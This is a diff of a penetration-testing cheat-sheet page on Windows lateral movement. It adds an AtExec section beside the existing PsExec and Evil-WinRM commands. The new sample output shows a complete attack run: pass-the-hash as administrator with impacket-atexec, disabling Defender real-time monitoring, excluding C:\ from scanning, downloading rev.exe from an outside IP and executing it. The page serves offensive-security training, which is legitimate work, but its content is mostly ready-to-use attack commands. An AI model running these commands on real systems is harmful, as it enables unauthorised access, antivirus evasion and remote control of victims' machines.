@@ -148,7 +148,8 @@
   <li><a href="https://tldrbins.github.io/@pass-the-ticket/">Pass-the-Ticket</a></li>
   <li><a href="https://tldrbins.github.io/@pass-the-cert/">Pass-the-Cert</a></li>
   <li><a href="https://tldrbins.github.io/@winrm/">Winrm</a></li>
-  <li><a href="https://tldrbins.github.io/@psexec/">Psexec</a></li>
+  <li><a href="https://tldrbins.github.io/@psexec/">PsExec</a></li>
+  <li><a href="https://tldrbins.github.io/@atexec/">AtExec</a></li>
 </ul>
 <hr>
 <div class="content">
@@ -162,7 +163,7 @@
   </ul>
 </div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="CCACHE">CCACHE: </label><input type="text" name="CCACHE"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="TARGET">TARGET: </label><input type="text" name="TARGET"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="CCACHE">CCACHE: </label><input type="text" name="CCACHE"></div><div class="input-group"><label for="CMD">CMD: </label><input type="text" name="CMD"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="TARGET">TARGET: </label><input type="text" name="TARGET"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="WORKGROUP">WORKGROUP: </label><input type="text" name="WORKGROUP"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Inspector</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -170,11 +171,11 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-  <h3 id="psexec">Psexec</h3>
+  <h3 id="psexec">PsExec</h3>
 <p class="tabs">
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Password</button>
 
-<button data-tabset="set1" data-tabcontent="tab2">Hash</button>
+<button data-tabset="set1" data-tabcontent="tab2">NTLM</button>
 
 </p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Domain auth
 </span></span><span class="line"><span class="cl"><span class="go">impacket-psexec '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>@<span class="o editable-keyword">&lt;TARGET&gt;</span>'
@@ -191,17 +192,71 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 TO-DO</div></pre></div></div></div>
 
 <p></p>
-<h3 id="evil-winrm">Evil-Winrm</h3>
+<h3 id="atexec">AtExec</h3>
 <p class="tabs">
 <button data-tabset="set2" data-tabcontent="tab1" class="active">Password</button>
 
-<button data-tabset="set2" data-tabcontent="tab2">Hash</button>
+<button data-tabset="set2" data-tabcontent="tab2">NTLM</button>
 
-<button data-tabset="set2" data-tabcontent="tab3">Kerberos</button>
+</p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Local auth
+</span></span><span class="line"><span class="cl"><span class="go">impacket-atexec '<span class="o editable-keyword">&lt;WORKGROUP&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>@<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>' 'powershell.exe -c "<span class="o editable-keyword">&lt;CMD&gt;</span>"'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Local auth
+</span></span><span class="line"><span class="cl"><span class="go">impacket-atexec '<span class="o editable-keyword">&lt;WORKGROUP&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>' -hashes :<span class="o editable-keyword">&lt;HASH&gt;</span> 'powershell.exe -c "<span class="o editable-keyword">&lt;CMD&gt;</span>"'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 <span class="s1">'WS01/administrator@WS01.example.com'</span> <span class="s1">'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'</span>
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] This will work ONLY on Windows &gt;= Vista
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating task \gNBJCrJi
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running task \gNBJCrJi
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Deleting task \gNBJCrJi
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Attempting to read ADMIN$\Temp\gNBJCrJi.tmp
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                                                                                                            
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 <span class="s1">'WS01/administrator@WS01.example.com'</span> <span class="s1">'powershell.exe -c "Set-MpPreference -ExclusionPath C:\\"'</span>
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] This will work ONLY on Windows &gt;= Vista
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating task \cbUEDAaz
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running task \cbUEDAaz
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Deleting task \cbUEDAaz
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Attempting to read ADMIN$\Temp\cbUEDAaz.tmp
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                                                                                                            
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 <span class="s1">'WS01/administrator@WS01.example.com'</span> <span class="s1">'powershell.exe -c "iwr 10.8.7.13:8443/rev.exe -outfile C:\programdata\rev.exe"'</span>
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] This will work ONLY on Windows &gt;= Vista
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating task \RmSAvink
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running task \RmSAvink
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Deleting task \RmSAvink
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Attempting to read ADMIN$\Temp\RmSAvink.tmp
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                                                                                                            
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 <span class="s1">'WS01/administrator@WS01.example.com'</span> <span class="s1">'powershell.exe -c "C:\programdata\rev.exe"'</span> 
+</span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] This will work ONLY on Windows &gt;= Vista
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating task \LCpKICMQ
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running task \LCpKICMQ
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Deleting task \LCpKICMQ
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Attempting to read ADMIN$\Temp\LCpKICMQ.tmp
+</span></span></span></div></pre></div></div></div>
 
-<button data-tabset="set2" data-tabcontent="tab4">crt &amp; key</button>
+<p></p>
+<h3 id="evil-winrm">Evil-Winrm</h3>
+<p class="tabs">
+<button data-tabset="set3" data-tabcontent="tab1" class="active">Password</button>
 
-</p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i <span class="o editable-keyword">&lt;TARGET&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
+<button data-tabset="set3" data-tabcontent="tab2">NTLM</button>
+
+<button data-tabset="set3" data-tabcontent="tab3">Kerberos</button>
+
+<button data-tabset="set3" data-tabcontent="tab4">crt &amp; key</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set3"><div class="tabcontent active" data-tabset="set3" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i <span class="o editable-keyword">&lt;TARGET&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> evil-winrm -i 127.0.0.1 -u dr.zaiuss -p <span class="s1">'qwe123QWE!@#'</span>
 </span></span><span class="line"><span class="cl"><span class="go">                                        
@@ -213,9 +268,9 @@ TO-DO</div></pre></div></div></div>
 </span></span></span><span class="line"><span class="cl"><span class="go">                                        
 </span></span></span><span class="line"><span class="cl"><span class="go">Info: Establishing connection to remote endpoint
 </span></span></span><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents&gt;
-</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i <span class="o editable-keyword">&lt;TARGET&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -H <span class="o editable-keyword">&lt;HASH&gt;</span> 
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i <span class="o editable-keyword">&lt;TARGET&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -H <span class="o editable-keyword">&lt;HASH&gt;</span> 
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab3"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Step 1: Edit <span class="s1">'/etc/krb5.conf'</span> <span class="o">(</span>All in uppercase<span class="o">)</span>
+TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set3" data-tabcontent="tab3"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Step 1: Edit <span class="s1">'/etc/krb5.conf'</span> <span class="o">(</span>All in uppercase<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[libdefaults]
 </span></span></span><span class="line"><span class="cl"><span class="go">    default_realm = <span class="o editable-keyword">&lt;DOMAIN&gt;</span>
@@ -264,7 +319,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class=
 </span></span></span><span class="line"><span class="cl"><span class="go">                                        
 </span></span></span><span class="line"><span class="cl"><span class="go">Info: Establishing connection to remote endpoint
 </span></span></span><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\winrm_user\Documents&gt; 
-</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab4"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i <span class="o editable-keyword">&lt;TARGET&gt;</span> -S -k auth.key -c auth.crt
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set3" data-tabcontent="tab4"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i <span class="o editable-keyword">&lt;TARGET&gt;</span> -S -k auth.key -c auth.crt
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div></div></div>
 
